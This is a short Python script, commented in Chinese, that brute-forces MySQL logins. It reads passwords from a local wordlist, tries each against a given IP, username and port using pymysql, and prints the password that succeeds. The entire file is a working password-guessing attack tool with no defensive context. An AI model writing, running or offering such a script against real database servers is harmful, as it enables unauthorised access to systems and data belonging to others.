# ###################MYSQL爆破#########################################
import pymysql
def connect(ip):
            username = input('请输入mysql的username:')
            port=input('input port:')
            port=int(port)
            with open('/home/frost/桌面/python/basic_scan/a.txt',"r") as fp:
                passwords = fp.readlines()
                for password in passwords:
                    password = password.strip()
                    try:
                        pymysql.connect(host=f'{ip}',user=username,password=password,port=port)
                        print(f',密码为{password}')
                        break
                    except:
                        print('aaa')